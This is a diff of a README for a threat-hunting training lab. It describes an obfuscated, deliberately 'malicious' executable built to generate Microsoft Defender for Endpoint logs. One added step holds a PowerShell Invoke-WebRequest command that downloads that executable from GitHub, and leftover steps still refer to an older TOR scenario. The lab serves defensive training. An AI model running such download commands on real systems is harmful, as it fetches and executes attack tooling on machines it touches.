@@ -6,9 +6,9 @@
 The "malicious" executable used within the project was originally written as a PowerShell script and converted into an exectuable using `PS2EXE` (https://github.com/MScholtes/PS2EXE). The intention of the executable was to emulate possible actions a threat actor would undertake once inside a system. I wanted the the executable to perform several commands to populate the `Microsoft Defender for Endpoint` logs. To add another layer of realism to the project, I obfuscated the commands to "challenge" and test a threat hunter's knolwedge and resourcefulness. While there were other possible network reconnaissance techniques the executable could have performed, I chose a non-intrusive technique in attempt to not disrupt other devices and systems on the network. 
 
 
-## Steps the "Bad Actor" took Create Logs and IoCs:
-1. Download the TOR browser installer: https://www.torproject.org/download/
-2. Install it silently: ```tor-browser-windows-x86_64-portable-14.0.1.exe /S```
+## Steps the Threat Actor Took to Create Logs and IoCs:
+1. Several failed user logons in quick succession.
+2. Opened a PowerShell terminal and executed the command `Invoke-WebRequest -Uri \"https://github.com/AaronRMartinez/Threat-Hunting-Scenario-Compromise/raw/refs/heads/main/MaliciousExecutable.exe\" -OutFile \"$env:USERPROFILE\\Downloads\\MaliciousExecutable.exe\"` to initiate the `MaliciousExecutable.exe` donwload.
 3. Opens the TOR browser from the folder on the desktop
 4. Connect to TOR and browse a few sites. For example:
    - **WARNING: The links to onion sites change a lot and these have changed. However if you connect to Tor and browse around normal sites a bit, the necessary logs should still be created:**
